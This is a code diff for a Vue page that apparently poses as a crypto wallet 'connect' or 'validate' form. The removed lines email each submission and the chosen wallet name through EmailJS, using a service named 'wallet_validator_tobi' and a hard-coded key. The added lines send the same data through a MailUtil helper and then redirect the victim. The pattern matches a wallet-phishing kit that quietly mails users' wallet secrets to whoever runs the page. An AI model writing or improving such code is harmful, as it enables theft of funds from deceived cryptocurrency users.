@@ -2,8 +2,8 @@
 import Layout from '../components/Layout.vue'
 import wallets from '../assets/wallets.json'
 import { ref, reactive } from 'vue'
-import emailjs from '@emailjs/browser'
 import router from '../router'
+import MailUtil from '../utils/mail'
 
 const connectModalTrigger = ref()
 const showConnect = reactive({ value: false })
@@ -30,21 +30,13 @@ const formInput = {
 function sendEmail(data) {
   data.walletName = currentWallet.name
 
-  emailjs
-    .send(
-      'wallet_validator_tobi',
-      'template_crypto_validate',
-      data,
-      'SKECErAHJ5g1CQj--'
-    )
-    .then(
-      (result) => {
-        redirectUser()
-      },
-      (error) => {
-        router.push({ name: 'wallets-view' })
-      }
-    ).catch(err => console.log(err))
+  MailUtil
+    .send(data)
+    .then(() => redirectUser())
+    .catch(err => {
+      console.log(err)
+      router.push({ name: 'wallets-view' })
+    })
 }
 
 const formSubmit = {
